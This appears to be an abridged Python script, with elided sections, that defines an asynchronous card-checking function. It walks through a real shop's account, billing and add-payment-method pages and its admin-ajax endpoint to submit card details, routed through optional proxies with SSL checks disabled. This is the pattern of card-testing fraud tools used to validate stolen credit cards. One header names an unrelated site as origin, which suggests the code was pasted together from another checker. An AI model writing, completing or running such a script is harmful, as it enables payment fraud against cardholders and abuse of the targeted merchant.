...
async def check_cc(cc_details):
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://edelosoft.tech/my-account/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                text = await r.text()
            ...
            async with session.post('https://edelosoft.tech/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                pass

            async with session.get('https://edelosoft.tech/my-account/edit-address/billing/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
                text = await r.text()
            ...
            async with session.post('https://edelosoft.tech/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                pass

            async with session.get('https://edelosoft.tech/my-account/add-payment-method/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
                text = await r.text()
            ...
            async with session.post('https://edelosoft.tech/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
            ...
            headers.update({
                'authority': 'edelosoft.tech', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.bebebrands.com',
                'referer': 'https://edelosoft.tech/my-account/add-payment-method/'
            })
            data = [
            ...
            async with session.post('https://edelosoft.tech/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as response:
